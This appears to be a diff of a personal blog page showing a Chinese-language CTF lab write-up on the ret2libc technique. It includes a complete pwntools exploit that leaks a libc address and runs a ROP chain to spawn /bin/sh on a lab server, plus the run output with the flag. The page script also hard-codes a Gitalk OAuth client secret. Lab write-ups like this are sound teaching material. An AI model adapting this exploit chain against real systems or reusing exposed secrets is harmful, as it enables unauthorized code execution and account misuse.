@@ -13,20 +13,24 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://kazma.tw/archives/2023/10/"/>
+    <link rel="canonical" href="https://kazma.tw/2023/12/18/yuawn-pwn2-ret2libc-writeup/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="kazma&#39;s personal space to dive deep into programming, cybersecurity challenges, CTF experiences, and insights from NCKU. Join me on my journey through the digital realm.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="kazma&#39;s blog">
-<meta property="og:url" content="https://kazma.tw/archives/2023/10/index.html">
+        <meta name="description" content="ret2libc基本上每個新的技術就是為了解決一個新的保護機制，那 ret2libc 主要就是能 bypass ASLR，那廢話不多說我們來整理一下這次的計畫： source code 基本上和上一題 ret2plt 差不多，但這次沒有 system 的 plt 可以 call，我們只好從 library 拿，那就必須知道 ASLR 所加上的 libc_base 是多少，知道以後再加上我們想要 c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Yuawn Pwn2 ret2libc Writeup">
+<meta property="og:url" content="https://kazma.tw/2023/12/18/Yuawn-Pwn2-ret2libc-Writeup/index.html">
 <meta property="og:site_name" content="kazma&#39;s blog">
-<meta property="og:description" content="kazma&#39;s personal space to dive deep into programming, cybersecurity challenges, CTF experiences, and insights from NCKU. Join me on my journey through the digital realm.">
+<meta property="og:description" content="ret2libc基本上每個新的技術就是為了解決一個新的保護機制，那 ret2libc 主要就是能 bypass ASLR，那廢話不多說我們來整理一下這次的計畫： source code 基本上和上一題 ret2plt 差不多，但這次沒有 system 的 plt 可以 call，我們只好從 library 拿，那就必須知道 ASLR 所加上的 libc_base 是多少，知道以後再加上我們想要 c">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-12-17T16:22:18.000Z">
+<meta property="article:modified_time" content="2023-12-17T16:49:21.074Z">
 <meta property="article:author" content="kazma">
-<meta property="article:tag" content="kazma, blog, ctf, reverse, engineering, pwn, binary, ncku, life, programming, coding, cybersecurity">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="lab">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
     
     
@@ -39,7 +43,7 @@
     
     <title>
         
-            Archive: 2023/10 -
+            Yuawn Pwn2 ret2libc Writeup -
         
         kazma&#39;s blog
     </title>
@@ -162,7 +166,7 @@
                         
                             <li class="navbar-item">
                                 <!-- Menu -->
-                                <a class="active" 
+                                <a class="" 
                                     href="/archives"  >
                                     
                                         
@@ -279,7 +283,7 @@
             
                 
                     <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
-                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group active" 
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                         href="/archives"  >
                              
                                 
@@ -370,135 +374,250 @@
             <div class="main-content">
 
                 
-                    <div class="archive-container ">
-    
+                    <div class="post-page-container">
+    <div class="article-content-container">
 
-<div class="archive-list-container">
-    
-        <section class="archive-item">
-            <div class="archive-item-header">
-                <span class="archive-year">2023</span>
-                <span class="archive-year-post-count">[12]</span>
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">Yuawn Pwn2 ret2libc Writeup</h1>
+            
             </div>
-            <ul class="article-list">
-              
-                
+            
                     
-                    <li class="article-item" date-is='12-18'>
+        
+        
+            <div class="article-header flex flex-row gap-2 items-center">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/kazma.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">kazma</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">成大資安社 創辦人/社長</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-12-18 00:22:18</span>
+        <span class="mobile">2023-12-18 00:22:18</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-12-18 00:49:21</span>
+            <span class="mobile">2023-12-18 00:49:21</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
                 
+                    <li>
+                        <a href="/tags/writeup/">writeup</a>&nbsp;
+                    </li>
                 
-                    <a href="/2023/12/18/Yuawn-Pwn2-ret2libc-Writeup/">
-                        <span class="article-title">Yuawn Pwn2 ret2libc Writeup</span>
-                    </a>
+                    <li>
+                        | <a href="/tags/lab/">lab</a>&nbsp;
+                    </li>
                 
-              
+                    <li>
+                        | <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
                 
-                    
-                    <li class="article-item" date-is='12-17'>
-                
-                
-                    <a href="/2023/12/17/Yuawn-Pwn2-ret2plt-Writeup/">
-                        <span class="article-title">Yuawn Pwn2 ret2plt Writeup</span>
-                    </a>
-                
-              
-                
-                    
-                    <li class="article-item" date-is='12-13'>
-                
-                
-                    <a href="/2023/12/13/Yuawn-Pwn1-casino-Writeup/">
-                        <span class="article-title">Yuawn Pwn1 casino Writeup</span>
-                    </a>
-                
-              
-                
-                    
-                    <li class="article-item" date-is='12-12'>
-                
-                
-                    <a href="/2023/12/12/LYS-Rop-lab-rop1-Writeup/">
-                        <span class="article-title">LYS Rop lab_rop1 Writeup</span>
-                    </a>
-                
-              
-                
-                
-                    <a href="/2023/12/12/Yuawn-Pwn2-rop-Writeup/">
-                        <span class="article-title">Yuawn Pwn2 rop Writeup</span>
-                    </a>
-                
-              
-                
-                    
-                    <li class="article-item" date-is='12-10'>
-                
-                
-                    <a href="/2023/12/10/Yuawn-Pwn1-orw-Writeup/">
-                        <span class="article-title">Yuawn Pwn1 orw Writeup</span>
-                    </a>
-                
-              
-                
-                
-                    <a href="/2023/12/10/Yuawn-Pwn1-bof-Writeup/">
-                        <span class="article-title">Yuawn Pwn1 bof Writeup</span>
-                    </a>
-                
-              
-                
-                
-                    <a href="/2023/12/10/LJP-Reverse1-main1-Writeup/">
-                        <span class="article-title">LJP Reverse1 main1 Writeup</span>
-                    </a>
-                
-              
-                
-                    
-                    <li class="article-item" date-is='12-09'>
-                
-                
-                    <a href="/2023/12/09/LJP-Reverse1-list-Writeup/">
-                        <span class="article-title">LJP Reverse1 list Writeup</span>
-                    </a>
-                
-              
-                
-                    
-                    <li class="article-item" date-is='12-03'>
-                
-                
-                    <a href="/2023/12/03/LJP-Reverse1-Writeups/">
-                        <span class="article-title">LJP Reverse1 baby Writeup</span>
-                    </a>
-                
-              
-                
-                    
-                    <li class="article-item" date-is='11-03'>
-                
-                
-                    <a href="/2023/11/03/2023%E7%A5%9E%E7%9B%BE%E6%9D%AF%E6%B1%BA%E8%B3%BD%E5%BF%83%E5%BE%97/">
-                        <span class="article-title">2023神盾杯決賽心得</span>
-                    </a>
-                
-              
-                
-                    
-                    <li class="article-item" date-is='10-26'>
-                
-                
-                    <a href="/2023/10/26/%E7%82%BA%E4%BB%80%E9%BA%BC%E6%88%91%E9%96%8B%E5%A7%8B%E5%AF%AB%E9%83%A8%E8%90%BD%E6%A0%BC/">
-                        <span class="article-title">為什麼我開始經營部落格</span>
-                    </a>
-                
-              
             </ul>
-        </section>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
     
 </div>
 
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body">
+            <h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>基本上每個新的技術就是為了解決一個新的保護機制，那 ret2libc 主要就是能 bypass ASLR，那廢話不多說我們來整理一下這次的計畫：</p>
+<p>source code 基本上和上一題 ret2plt 差不多，但這次沒有 system 的 plt 可以 call，我們只好從 library 拿，那就必須知道 ASLR 所加上的 libc_base 是多少，知道以後再加上我們想要 call 的 function 的 offset 就是實際對應 function pointer 的位置。</p>
+<ol>
+<li>那首先我們 call puts 的 plt 去印出 libc_start_main 的 got，之所以選擇 libc_start_main 是因為我們需要確保在 call 的時候 got 已經被 resolve 過，而 libc_start_main 會比 main 還要早被執行，所以是個很好的目標，拿到後再減掉 offset 就拿到 libc_base 了。</li>
+<li>再來我們需要在拿到 base 的同一次攻擊中去呼叫 system，而我們的做法就是跳回 main 再重新 overflow 來送出我們的第二次 payload。</li>
+<li>再來就是基本的 rop，值得注意的是有 libc_base 之後，就可以用工具來幫我們找 ‘&#x2F;bin&#x2F;sh’ 字串和 system 的位置，詳情請見 exploit.py：</li>
+</ol>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">l = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;10.129.0.67&#x27;</span>, <span class="number">10175</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_got = <span class="number">0x0000000000600ff0</span></span><br><span class="line">libc_start_main_offset = <span class="number">0x0000000000021ba0</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">puts_plt = <span class="number">0x0000000000400520</span></span><br><span class="line">main = <span class="number">0x0000000000400698</span></span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    libc_start_main_got,</span><br><span class="line">    puts_plt,</span><br><span class="line">    main</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:D&#x27;</span>, p)</span><br><span class="line">r.recvline()</span><br><span class="line">l.address = u64( r.recv(<span class="number">6</span>) + <span class="string">b&#x27;\0\0&#x27;</span>) - libc_start_main_offset</span><br><span class="line">success(<span class="string">&#x27;libc_base -&gt; %s&#x27;</span> % <span class="built_in">hex</span>(l.address))</span><br><span class="line"></span><br><span class="line">p2 = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>,</span><br><span class="line">    ret,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    l.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>(),</span><br><span class="line">    l.sym.system</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:D&#x27;</span>, p2)</span><br><span class="line">r.sendline(<span class="string">&#x27;cat /home/`whoami`/flag&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>執行結果：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] <span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 10.129.0.67 on port 10175: Done</span><br><span class="line">[+] libc_base -&gt; 0x7ff99a358000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">FLAG&#123;ret21ibc_15_p0werfu1&#125;</span><br></pre></td></tr></table></figure></div>
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Yuawn Pwn2 ret2libc Writeup</li>
+        <li><strong>Author:</strong> kazma</li>
+        <li><strong>Created at
+                :</strong> 2023-12-18 00:22:18</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-12-18 00:49:21
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kazma.tw/2023/12/18/Yuawn-Pwn2-ret2libc-Writeup/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+            This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+            
+
+        </li>
+    </ul>
 </div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/writeup/">#writeup</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/lab/">#lab</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/12/17/Yuawn-Pwn2-ret2plt-Writeup/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Yuawn Pwn2 ret2plt Writeup</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: '68fd7e0e6c37358fbb4f',
+                    clientSecret: 'dc6a9d6490a92521e96b38717770845226846c62',
+                    repo: 'kazmatw.github.io',
+                    owner: 'kazmatw',
+                    admin: ['kazmatw'],
+                    id: __gitalk__pathname,
+                    language: 'en'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Yuawn Pwn2 ret2libc Writeup</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libc"><span class="nav-text">ret2libc</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
 
                 
 
@@ -571,6 +690,27 @@
         </div>
     </div>
 
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
     
 
     <div class="right-side-tools-container">
